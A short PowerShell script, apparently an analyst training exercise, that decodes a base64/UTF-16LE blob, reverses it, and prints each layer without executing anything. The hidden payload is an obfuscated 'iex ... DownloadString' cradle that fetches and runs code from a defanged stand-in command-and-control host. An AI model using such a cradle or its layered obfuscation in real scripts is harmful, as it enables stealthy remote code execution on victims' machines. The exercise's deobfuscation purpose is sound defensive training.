# peel.ps1 -- one payload, TWO stacked layers: a base64/UTF-16LE blob wrapping a
# character-reversed string. Real samples stack techniques exactly like this, so you
# peel one layer at a time and PRINT what each layer produced. Every line here only
# decodes, reverses, and prints -- no layer is ever executed, intermediate or final.
$blob = 'KQAnADUAcAAvAHQAcwBlAHQAXQAuAFsAMgBjAC0AZQBrAGEAZgAuAG4AZABjAC8ALwA6AHMAcAB4AHgAaAAnACgAZwBuAGkAcgB0AFMAZABhAG8AbABuAHcAbwBEAC4AKQB0AG4AZQBpAGwAQwBiAGUAVwAuAHQAZQBOACAAdABjAGUAagBiAE8ALQB3AGUATgAoACAAeABlAGkA'
$layer1 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($blob))
$layer2 = -join $layer1[-1..-$layer1.Length]

Write-Output "layer 1 -- base64 decoded, still reversed: $layer1"
Write-Output "layer 2 -- reversed back, plaintext:       $layer2"
